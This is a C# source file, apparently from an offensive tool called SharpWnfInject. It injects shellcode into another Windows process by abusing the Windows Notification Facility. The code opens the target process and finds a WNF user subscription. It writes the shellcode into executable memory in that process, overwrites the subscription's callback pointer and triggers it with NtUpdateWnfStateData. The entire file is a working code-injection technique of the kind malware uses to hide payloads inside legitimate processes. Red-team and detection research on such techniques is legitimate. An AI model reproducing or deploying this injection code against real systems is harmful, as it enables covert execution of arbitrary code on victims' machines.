using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Security;
using SharpWnfInject.Interop;

namespace SharpWnfInject.Library
{
    using NTSTATUS = Int32;
    using SIZE_T = UIntPtr;

    internal class Modules
    {
        public static bool InjectShellcode(
            int pid,
            ulong stateName,
            string filePath,
            bool debug)
        {
            string fullPath;
            byte[] shellcode;

            try
            {
                fullPath = Path.GetFullPath(filePath);
            }
            catch (SecurityException ex)
            {
                Console.WriteLine("[-] {0}\n", ex.Message);

                return false;
            }
            catch (ArgumentNullException ex)
            {
                Console.WriteLine("[-] {0}\n", ex.Message);

                return false;
            }
            catch (NotSupportedException ex)
            {
                Console.WriteLine("[-] {0}\n", ex.Message);

                return false;
            }
            catch (PathTooLongException ex)
            {
                Console.WriteLine("[-] {0}\n", ex.Message);

                return false;
            }

            if (File.Exists(fullPath))
            {
                try
                {
                    shellcode = File.ReadAllBytes(fullPath);
                }
                catch (ArgumentException ex)
                {
                    Console.WriteLine("[-] {0}\n", ex.Message);

                    return false;
                }
                catch (PathTooLongException ex)
                {
                    Console.WriteLine("[-] {0}\n", ex.Message);

                    return false;
                }
                catch (DirectoryNotFoundException ex)
                {
                    Console.WriteLine("[-] {0}\n", ex.Message);

                    return false;
                }
                catch (IOException ex)
                {
                    Console.WriteLine("[-] {0}\n", ex.Message);

                    return false;
                }
                catch (UnauthorizedAccessException ex)
                {
                    Console.WriteLine("[-] {0}\n", ex.Message);

                    return false;
                }
                catch (NotSupportedException ex)
                {
                    Console.WriteLine("[-] {0}\n", ex.Message);

                    return false;
                }
                catch (SecurityException ex)
                {
                    Console.WriteLine("[-] {0}\n", ex.Message);

                    return false;
                }

                return InjectShellcode(pid, stateName, shellcode, debug);
            }
            else
            {
                Console.WriteLine("[-] Specified file is not exist.\n");

                return false;
            }
        }

        public static bool InjectShellcode(
            int pid,
            ulong stateName,
            byte[] shellcode,
            bool debug)
        {
            NTSTATUS ntstatus;
            IntPtr pInfoBuffer;
            bool bIs32BitProcess;
            string imageFileName;
            string processName;
            string wellKnownName = Helpers.GetWnfName(stateName);
            var objectAttributes = new OBJECT_ATTRIBUTES
            {
                Length = Marshal.SizeOf(typeof(OBJECT_ATTRIBUTES))
            };
            var clientId = new CLIENT_ID { UniqueProcess = new IntPtr(pid) };
            var pShellcodeBuffer = IntPtr.Zero;
            var bSuccess = false;

            if (debug)
            {
                if (Utilities.EnableDebugPrivilege())
                {
                    Console.WriteLine("[+] SeDebugPrivilege is enabled successfully.");
                }
                else
                {
                    Console.WriteLine("[-] Failed to enable SeDebugPrivilege.");
                    return false;
                }
            }

            ntstatus = NativeMethods.NtOpenProcess(
                out IntPtr hProcess,
                ACCESS_MASK.PROCESS_QUERY_LIMITED_INFORMATION | ACCESS_MASK.PROCESS_VM_OPERATION | ACCESS_MASK.PROCESS_VM_READ | ACCESS_MASK.PROCESS_VM_WRITE,
                in objectAttributes,
                in clientId);

            if (ntstatus != Win32Consts.STATUS_SUCCESS)
            {
                Console.WriteLine("[-] Failed to get handle from the target process (NTSTATUS = 0x{0}).", ntstatus.ToString("X8"));
                return false;
            }

            bIs32BitProcess = Helpers.Is32BitProcess(hProcess);
            imageFileName = Helpers.GetProcessImageFileName(hProcess);
            processName = string.IsNullOrEmpty(imageFileName) ? "(N/A)" : Path.GetFileName(imageFileName);

            Console.WriteLine("[*] Target WNF State Name is 0x{0} ({1}).", stateName.ToString("X16"), wellKnownName);
            Console.WriteLine("[+] Got a handle from the target Process");
            Console.WriteLine("    [*] Process Name    : {0}", processName);
            Console.WriteLine("    [*] Process ID      : {0}", pid);
            Console.WriteLine("    [*] Image File Name : {0}", imageFileName);
            Console.WriteLine("    [*] Architecture    : {0}", Helpers.GetProcessArchitecture(hProcess).ToString());

            pInfoBuffer = Marshal.AllocHGlobal(shellcode.Length);
            Marshal.Copy(shellcode, 0, pInfoBuffer, shellcode.Length);

            do
            {
                IntPtr pSubscriptionTable;
                IntPtr pSavedCallback;
                IntPtr pCallbackPointer;
                IntPtr pUserSubscription;
                uint nCallbackOffset;
                Dictionary<ulong, IntPtr> nameSubscriptions;
                Dictionary<IntPtr, KeyValuePair<IntPtr, IntPtr>> userSubscriptions;
                uint nPointerSize = bIs32BitProcess ? 4u : 8u;
                string addressFormat = Environment.Is64BitProcess ? "X16" : "X8";
                IntPtr pTablePointer = Utilities.GetSubscriptionTablePointerAddress(hProcess);
                var nBufferLength = new SIZE_T((uint)shellcode.Length);

                if (!bIs32BitProcess)
                    nCallbackOffset = (uint)Marshal.OffsetOf(typeof(WNF_USER_SUBSCRIPTION64), "Callback");
                else
                    nCallbackOffset = (uint)Marshal.OffsetOf(typeof(WNF_USER_SUBSCRIPTION32), "Callback");

                if (pTablePointer == IntPtr.Zero)
                {
                    Console.WriteLine("[-] Failed to get pointer for WNF_SUBSCRIPTION_TABLE.");
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Pointer for WNF_SUBSCRIPTION_TABLE is at 0x{0}.", pTablePointer.ToString(addressFormat));
                }

                pSubscriptionTable = Utilities.GetSubscriptionTable(hProcess, pTablePointer);

                if (pSubscriptionTable == IntPtr.Zero)
                {
                    Console.WriteLine("[-] Failed to get WNF_SUBSCRIPTION_TABLE.");
                    break;
                }
                else
                {
                    Console.WriteLine("[+] WNF_SUBSCRIPTION_TABLE is at 0x{0}.", pSubscriptionTable.ToString(addressFormat));
                }

                if (Globals.g_IsWin11)
                    nameSubscriptions = Utilities.GetNameSubscriptionsWin11(hProcess, pSubscriptionTable);
                else
                    nameSubscriptions = Utilities.GetNameSubscriptions(hProcess, pSubscriptionTable);

                if (nameSubscriptions.Count == 0)
                {
                    Console.WriteLine("[-] Failed to get WNF_NAME_SUBSCRIPTION.");
                    break;
                }

                if (!nameSubscriptions.ContainsKey(stateName))
                {
                    Console.WriteLine("[-] Target process does not use the WNF State Name.");
                    break;
                }
                else
                {
                    Console.WriteLine("[*] WNF_NAME_SUBSCRIPTION is at 0x{0}.", nameSubscriptions[stateName].ToString(addressFormat));
                }

                userSubscriptions = Utilities.GetUserSubscriptions(hProcess, nameSubscriptions[stateName]);

                if (userSubscriptions.Count == 0)
                {
                    Console.WriteLine("[-] No WNF_USER_SUBSCRIPTION.");
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Got {0} WNF_USER_SUBSCRIPTION.", userSubscriptions.Count);
                }

                pUserSubscription = userSubscriptions.Keys.First();
                pSavedCallback = userSubscriptions[pUserSubscription].Key;

                if (Environment.Is64BitProcess)
                    pCallbackPointer = new IntPtr(pUserSubscription.ToInt64() + nCallbackOffset);
                else
                    pCallbackPointer = new IntPtr(pUserSubscription.ToInt32() + (int)nCallbackOffset);

                Console.WriteLine("[*] Target callback pointer is at 0x{0}. Points to 0x{1} ({2}).",
                    pCallbackPointer.ToString(addressFormat),
                    pSavedCallback.ToString(addressFormat),
                    Helpers.GetSymbolPath(hProcess, pSavedCallback) ?? "N/A");

                ntstatus = NativeMethods.NtAllocateVirtualMemory(
                    hProcess,
                    ref pShellcodeBuffer,
                    SIZE_T.Zero,
                    ref nBufferLength,
                    ALLOCATION_TYPE.COMMIT | ALLOCATION_TYPE.RESERVE,
                    MEMORY_PROTECTION.PAGE_READWRITE);

                if (ntstatus != Win32Consts.STATUS_SUCCESS)
                {
                    Console.WriteLine("[-] Failed to allocate shellcode buffer (BTSTATUS = 0x{0}).", ntstatus.ToString("X8"));
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Shellcode buffer is at 0x{0}.", pShellcodeBuffer.ToString(addressFormat));
                }

                ntstatus = NativeMethods.NtWriteVirtualMemory(
                    hProcess,
                    pShellcodeBuffer,
                    pInfoBuffer,
                    (uint)shellcode.Length,
                    out uint nWrittenBytes);

                if ((ntstatus != Win32Consts.STATUS_SUCCESS) || (nWrittenBytes != (uint)shellcode.Length))
                {
                    Console.WriteLine("[-] Failed to write shellcode (BTSTATUS = 0x{0}).", ntstatus.ToString("X8"));
                    break;
                }
                else
                {
                    Console.WriteLine("[+] {0} bytes shellcode is written successfully.", shellcode.Length);
                }

                ntstatus = NativeMethods.NtProtectVirtualMemory(
                    hProcess,
                    ref pShellcodeBuffer,
                    ref nWrittenBytes,
                    MEMORY_PROTECTION.PAGE_EXECUTE_READ,
                    out MEMORY_PROTECTION _);

                if (ntstatus != Win32Consts.STATUS_SUCCESS)
                {
                    Console.WriteLine("[-] Failed to update shellcode buffer protection (BTSTATUS = 0x{0}).", ntstatus.ToString("X8"));
                    break;
                }

                if (!bIs32BitProcess)
                    Marshal.WriteInt64(pInfoBuffer, pShellcodeBuffer.ToInt64());
                else
                    Marshal.WriteInt32(pInfoBuffer, pShellcodeBuffer.ToInt32());

                ntstatus = NativeMethods.NtWriteVirtualMemory(
                    hProcess,
                    pCallbackPointer,
                    pInfoBuffer,
                    nPointerSize,
                    out nWrittenBytes);

                if ((ntstatus != Win32Consts.STATUS_SUCCESS) || (nWrittenBytes != nPointerSize))
                {
                    Console.WriteLine("[-] Failed to overwrite callback pointer (BTSTATUS = 0x{0}).", ntstatus.ToString("X8"));
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Callback pointer is overwritten successfully.");
                }

                Console.WriteLine("[>] Triggering shellcode.");

                ntstatus = NativeMethods.NtUpdateWnfStateData(
                    in stateName,
                    IntPtr.Zero,
                    0,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    0,
                    0);

                if (ntstatus != Win32Consts.STATUS_SUCCESS)
                {
                    Console.WriteLine("[-] Failed to update WNF State Data (NTSTATUS = 0x{0}).", ntstatus.ToString("X8"));
                    break;
                }
                else
                {
                    bSuccess = true;
                    Console.WriteLine("[+] WNF State Data is updated successfully. Shellcode might be executed.");
                }

                if (!bIs32BitProcess)
                    Marshal.WriteInt64(pInfoBuffer, pSavedCallback.ToInt64());
                else
                    Marshal.WriteInt32(pInfoBuffer, pSavedCallback.ToInt32());

                ntstatus = NativeMethods.NtWriteVirtualMemory(
                    hProcess,
                    pCallbackPointer,
                    pInfoBuffer,
                    nPointerSize,
                    out nWrittenBytes);

                if ((ntstatus != Win32Consts.STATUS_SUCCESS) || (nWrittenBytes != nPointerSize))
                    Console.WriteLine("[-] Failed to revert callback pointer (NTSTATUS = 0x{0}).", ntstatus.ToString("X8"));
                else
                    Console.WriteLine("[+] Callback pointer is reverted successfully.");
            } while (false);

            Marshal.FreeHGlobal(pInfoBuffer);
            NativeMethods.NtClose(hProcess);

            if (!bSuccess && (pShellcodeBuffer != IntPtr.Zero))
            {
                var nRegionSize = SIZE_T.Zero;
                NativeMethods.NtFreeVirtualMemory(
                    hProcess,
                    ref pShellcodeBuffer,
                    ref nRegionSize,
                    ALLOCATION_TYPE.RELEASE);
            }

            Console.WriteLine("[*] Done.");

            return bSuccess;
        }
    }
}
